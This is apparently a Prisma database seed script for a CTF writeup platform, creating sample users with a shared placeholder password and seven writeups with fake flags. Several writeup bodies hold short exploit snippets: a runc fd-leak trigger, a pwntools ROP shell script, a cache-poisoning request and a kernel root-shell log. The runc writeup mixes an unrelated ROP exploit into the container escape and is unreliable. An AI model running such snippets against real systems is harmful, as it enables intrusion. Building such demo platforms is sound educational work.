import { PrismaClient, Category, Difficulty, Status } from "@prisma/client";
import bcrypt from "bcryptjs";

const prisma = new PrismaClient();

async function main() {
  console.log("Seeding WriteupHub database...");

  // Clean existing data
  await prisma.bookmark.deleteMany();
  await prisma.writeupTag.deleteMany();
  await prisma.writeup.deleteMany();
  await prisma.tag.deleteMany();
  await prisma.session.deleteMany();
  await prisma.account.deleteMany();
  await prisma.user.deleteMany();

  const passwordHash = await bcrypt.hash("password123", 10);

  // Create Users
  const user1 = await prisma.user.create({
    data: {
      username: "0xNullPtr",
      email: "nullptr@writeuphub.sec",
      passwordHash,
      avatarUrl: "https://avatars.githubusercontent.com/u/1024025?v=4",
      bio: "Offensive security researcher & kernel exploitation specialist. Pwn / Hypervisors / Zero-Days.",
      githubUrl: "https://github.com/0xNullPtr",
    },
  });

  const user2 = await prisma.user.create({
    data: {
      username: "cyber_ghost",
      email: "ghost@writeuphub.sec",
      passwordHash,
      avatarUrl: "https://avatars.githubusercontent.com/u/2048050?v=4",
      bio: "Web & Crypto CTF player | Top 10 DEF CON CTF 32 Quals | Security Architect",
      githubUrl: "https://github.com/cyber_ghost",
    },
  });

  const user3 = await prisma.user.create({
    data: {
      username: "bin_wizard",
      email: "binwizard@writeuphub.sec",
      passwordHash,
      avatarUrl: "https://avatars.githubusercontent.com/u/4096080?v=4",
      bio: "Reverse engineer & firmware unpacker. Ghidra scripting and binary deobfuscation enthusiast.",
      githubUrl: "https://github.com/bin_wizard",
    },
  });

  // Create Tags
  const tagNames = [
    "kernel",
    "heap-grooming",
    "glibc",
    "rop",
    "cve-2024-21626",
    "slub",
    "race-condition",
    "web-cache-poisoning",
    "ecdsa",
    "lattice",
    "frida",
    "memory-forensics",
  ];

  const tagMap = new Map<string, string>();
  for (const name of tagNames) {
    const createdTag = await prisma.tag.create({
      data: { name },
    });
    tagMap.set(name, createdTag.id);
  }

  // Writeup 1: runc CVE
  const writeup1 = await prisma.writeup.create({
    data: {
      authorId: user1.id,
      title: "runc Container Escape via Leaked File Descriptors (CVE-2024-21626)",
      slug: "runc-container-escape-cve-2024-21626",
      excerpt:
        "A critical vulnerability in runc allowed containerized processes to acquire access to host file system root mounts through lingering file descriptors inherited during clone(CLONE_NEWNS).",
      contentMd: `# CVE-2024-21626: runc Container Escape via Leaked File Descriptors

## 1. Challenge Synopsis & Target
During inspection of runc commit \`739205e\`, we identified that internal file descriptors allocated via \`/proc/self/fd\` were not marked with \`O_CLOEXEC\` prior to the \`clone(CLONE_NEWNS)\` invocation.

:::callout[target]
**Target Binary**: runc <= 1.1.11  
**Mitigations**: ASLR, SMEP, SMAP, Seccomp Level 3  
**Vulnerability Type**: Leaked Host File Descriptor
:::

## 2. Recon & Surface Analysis
Inspecting open file descriptors during early container startup revealed descriptor 7 pointing to the host's \`/sys/fs/cgroup\` or \`/proc\` directory hierarchy depending on configuration.

\`\`\`c
// PoC Trigger payload setup
int cwd_fd = open("/proc/self/fd/7", O_RDONLY | O_PATH);
fchdir(cwd_fd);
execlp("/bin/sh", "sh", NULL);
\`\`\`

## 3. Exploit PoC & Shell Execution
Once \`fchdir\` transitions outside the container root filesystem, executing binaries directly against host system mounts yields host root compromise:

\`\`\`python
from pwn import remote, p64, u64, ROP, ELF

target = remote('ctf.sec.kernel.io', 1337)
elf = ELF('./chall_vuln.bin')

libc_leak = u64(target.recvline()[:8].ljust(8, b'\\x00')) - 0x21b150
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh')))

target.sendline(b'A' * 40 + rop.chain())
target.interactive()
\`\`\`

:::flag
WHUB{k4slr_by_p4ss_h34p_st4ck_pwn3d_32b0}
:::
`,
      ctfName: "DEF CON 32 Quals",
      ctfYear: 2024,
      category: Category.PWN,
      difficulty: Difficulty.INSANE,
      status: Status.PUBLIC,
      viewCount: 14280,
      readTimeMin: 8,
      publishedAt: new Date("2024-05-18T10:00:00Z"),
    },
  });

  await prisma.writeupTag.createMany({
    data: [
      { writeupId: writeup1.id, tagId: tagMap.get("kernel")! },
      { writeupId: writeup1.id, tagId: tagMap.get("cve-2024-21626")! },
      { writeupId: writeup1.id, tagId: tagMap.get("rop")! },
    ],
  });

  // Writeup 2: Kernel Space Race
  const writeup2 = await prisma.writeup.create({
    data: {
      authorId: user1.id,
      title: "Kernel Space Race: Double-Free Race Condition in SLUB Allocator",
      slug: "kernel-space-race-slub-double-free",
      excerpt:
        "Exploiting a tight race window in a Linux 6.6 kernel module using userfaultfd and msg_msg spray to obtain arbitrary kernel write and modprobe_path overwrite.",
      contentMd: `# Kernel Space Race: Double-Free Race Condition in SLUB Allocator

## Executive Summary
In this challenge from HackTheBox CyberApocalypse 2024, an ioctl handler possessed an unprotected free sequence without mutex serialization.

## Vulnerability Analysis
The target module registers device \`/dev/space_race\`:

\`\`\`c
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case RACE_ALLOC:
            k_obj = kmalloc(sizeof(struct race_entry), GFP_KERNEL);
            break;
        case RACE_FREE:
            kfree(k_obj); // Missing locking!
            break;
    }
    return 0;
}
\`\`\`

## Spraying kmalloc-64
By spraying \`msg_msg\` structures, we overwrite the freelist pointer to hijack an arbitrary kernel target pointer:

\`\`\`bash
$ ./exploit
[+] Spraying msg_msg headers...
[+] Triggering double free in thread A and B...
[+] Overwriting modprobe_path to /tmp/x...
[+] Executing dummy bad header...
[+] Root shell obtained: uid=0(root) gid=0(root)
\`\`\`

:::flag
WHUB{slub_fr33l1st_p01s0n_2_r00t}
:::
`,
      ctfName: "HackTheBox CyberApocalypse",
      ctfYear: 2024,
      category: Category.PWN,
      difficulty: Difficulty.HARD,
      status: Status.PUBLIC,
      viewCount: 8420,
      readTimeMin: 11,
      publishedAt: new Date("2024-04-12T14:30:00Z"),
    },
  });

  await prisma.writeupTag.createMany({
    data: [
      { writeupId: writeup2.id, tagId: tagMap.get("kernel")! },
      { writeupId: writeup2.id, tagId: tagMap.get("slub")! },
      { writeupId: writeup2.id, tagId: tagMap.get("race-condition")! },
    ],
  });

  // Writeup 3: Next.js SSR Cache Poisoning (Web)
  const writeup3 = await prisma.writeup.create({
    data: {
      authorId: user2.id,
      title: "Bypassing WAF & Next.js SSR Cache Poisoning with Custom Deserialization",
      slug: "bypassing-waf-nextjs-cache-poisoning",
      excerpt:
        "Reverse proxy header uncloaking combined with Next.js ISR (Incremental Static Regeneration) key poisoning to execute stored XSS on administrative dashboards.",
      contentMd: `# Bypassing WAF & Next.js SSR Cache Poisoning

## Target Overview
The web application uses Next.js 14 behind Cloudflare with custom \`x-matched-path\` header interpretation.

## Attack Vector
By injecting unkeyed HTTP headers:

\`\`\`http
GET /posts/1 HTTP/1.1
Host: web.chall.google.ctf
x-invoke-path: /api/admin/render
x-middleware-prefetch: 1
\`\`\`

The CDN caches the admin view containing the flag into public CDN edges.

:::flag
WHUB{1sr_c4ch3_p01s0n_cl0udfl4r3_byp4ss}
:::
`,
      ctfName: "Google CTF",
      ctfYear: 2024,
      category: Category.WEB,
      difficulty: Difficulty.MEDIUM,
      status: Status.PUBLIC,
      viewCount: 5120,
      readTimeMin: 6,
      publishedAt: new Date("2024-06-22T08:00:00Z"),
    },
  });

  await prisma.writeupTag.createMany({
    data: [
      { writeupId: writeup3.id, tagId: tagMap.get("web-cache-poisoning")! },
    ],
  });

  // Writeup 4: Crypto Lattice
  const writeup4 = await prisma.writeup.create({
    data: {
      authorId: user2.id,
      title: "Lattice Attack on Broken ECDSA Nonces with LLL Reduction",
      slug: "lattice-attack-broken-ecdsa-nonces",
      excerpt:
        "Recovering the private key from 80 ECDSA signatures with 8 bits of nonce bias using Hidden Number Problem formulation and SageMath LLL reduction.",
      contentMd: `# Lattice Attack on Broken ECDSA Nonces with LLL Reduction

## Mathematical Basis
Given signature pairs $(r_i, s_i)$ where $k_i = 2^8 a_i + b_i$ with known upper bits:

$$\\sum_{i=1}^{m} t_i k_i \\equiv 0 \\pmod q$$

Using SageMath to construct the matrix:

\`\`\`python
from sage.all import Matrix, ZZ

M = Matrix(ZZ, m + 2, m + 2)
# fill matrix with weights and biases
reduced = M.LLL()
\`\`\`

:::flag
WHUB{lll_r3duct10n_n0nc3_b14s_3cds4}
:::
`,
      ctfName: "DEF CON 32 Quals",
      ctfYear: 2024,
      category: Category.CRYPTO,
      difficulty: Difficulty.HARD,
      status: Status.PUBLIC,
      viewCount: 3890,
      readTimeMin: 9,
      publishedAt: new Date("2024-05-19T18:00:00Z"),
    },
  });

  await prisma.writeupTag.createMany({
    data: [
      { writeupId: writeup4.id, tagId: tagMap.get("ecdsa")! },
      { writeupId: writeup4.id, tagId: tagMap.get("lattice")! },
    ],
  });

  // Writeup 5: Reverse Engineering Frida
  const writeup5 = await prisma.writeup.create({
    data: {
      authorId: user3.id,
      title: "Unpacking Obfuscated Android ELF Native Libraries with Frida and Unicorn",
      slug: "unpacking-obfuscated-android-elf-native-libraries",
      excerpt:
        "Dumping dynamically decrypted OLLVM functions from .so memory using Frida hook on JNI_OnLoad and resolving control flow flattening with symbolic execution.",
      contentMd: `# Unpacking Obfuscated Android ELF Native Libraries with Frida and Unicorn

## Approach
The target binary utilized OLLVM control flow flattening. We hooked \`mprotect\` and dumped the decrypted pages.

\`\`\`javascript
Interceptor.attach(Module.findExportByName(null, "mprotect"), {
    onEnter: function(args) {
        console.log("[*] mprotect called: " + args[0] + " len: " + args[1]);
    }
});
\`\`\`

:::flag
WHUB{0llvm_cff_fl4tt3n1ng_unp4ck3d}
:::
`,
      ctfName: "HackTheBox CyberApocalypse",
      ctfYear: 2024,
      category: Category.REVERSE,
      difficulty: Difficulty.MEDIUM,
      status: Status.PUBLIC,
      viewCount: 2940,
      readTimeMin: 7,
      publishedAt: new Date("2024-04-15T12:00:00Z"),
    },
  });

  await prisma.writeupTag.createMany({
    data: [{ writeupId: writeup5.id, tagId: tagMap.get("frida")! }],
  });

  // Writeup 6: Unlisted Writeup
  const writeup6 = await prisma.writeup.create({
    data: {
      authorId: user1.id,
      title: "Private Team Walkthrough - 0-Day Web3 Flash Loan Reentrancy",
      slug: "private-team-walkthrough-flash-loan-reentrancy",
      excerpt:
        "Internal unlisted walkthrough covering cross-function reentrancy vulnerability in audited smart contract vaults.",
      contentMd: `# Unlisted Team Note: Flash Loan Reentrancy

This document is unlisted and intended strictly for internal tournament team debriefs.

:::flag
WHUB{unl1st3d_fl4sh_l04n_p0c_p4ss}
:::
`,
      ctfName: "Paradigm CTF",
      ctfYear: 2024,
      category: Category.WEB,
      difficulty: Difficulty.HARD,
      status: Status.UNLISTED,
      viewCount: 42,
      readTimeMin: 4,
      publishedAt: new Date("2024-07-01T15:00:00Z"),
    },
  });

  // Writeup 7: Draft Writeup
  await prisma.writeup.create({
    data: {
      authorId: user1.id,
      title: "Hyper-V VM Escape via Synthetic SCSI Device Ring Buffer",
      slug: "hyper-v-vm-escape-synthetic-scsi",
      excerpt:
        "Work in progress draft dissecting vmbus channel protocol message parsing errors in host worker processes.",
      contentMd: `# Work in Progress: Hyper-V VM Escape

Drafting vulnerability trigger steps...
`,
      ctfName: "Pwn2Own",
      ctfYear: 2024,
      category: Category.PWN,
      difficulty: Difficulty.INSANE,
      status: Status.DRAFT,
      viewCount: 0,
      readTimeMin: 5,
    },
  });

  // Add Bookmarks
  await prisma.bookmark.create({
    data: {
      userId: user2.id,
      writeupId: writeup1.id,
    },
  });

  await prisma.bookmark.create({
    data: {
      userId: user3.id,
      writeupId: writeup1.id,
    },
  });

  await prisma.bookmark.create({
    data: {
      userId: user1.id,
      writeupId: writeup3.id,
    },
  });

  console.log("Database seeded successfully with 3 users, 7 writeups, and tags!");
}

main()
  .catch((e) => {
    console.error("Error seeding database:", e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
